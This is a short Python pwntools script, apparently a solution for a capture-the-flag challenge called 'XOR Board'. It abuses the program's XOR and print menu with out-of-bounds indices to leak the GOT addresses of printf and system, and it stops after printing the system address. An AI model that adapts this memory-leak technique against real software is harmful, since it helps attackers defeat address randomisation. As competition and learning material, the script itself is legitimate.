from pwn import *

rem = process("./Pwnable/XOR Board/problem/deploy/main")
# gdb.attach(rem)

elf = ELF("./Pwnable/XOR Board/problem/deploy/main")

arr_offset = elf.symbols['arr']
win_offset = elf.symbols['win']
printf_got_offset = elf.got['printf']
system_got_offset = elf.got['system']

def xor(i, j):
  rem.sendlineafter(b"> ", b"1")
  rem.sendlineafter(b"> ", f"{i} {j}".encode())

def print_hex(i):
  rem.sendlineafter(b"> ", b"2")
  rem.sendlineafter(b"> ", f"{i}".encode())
  rem.recvuntil(b"Value: ")
  return int(rem.recvline().rstrip().decode(), 16)

xor(65, (printf_got_offset-arr_offset) // 8)
printf_addr = print_hex(65)
xor(66, (system_got_offset-arr_offset) // 8)
system_addr = print_hex(66)
print(hex(system_addr))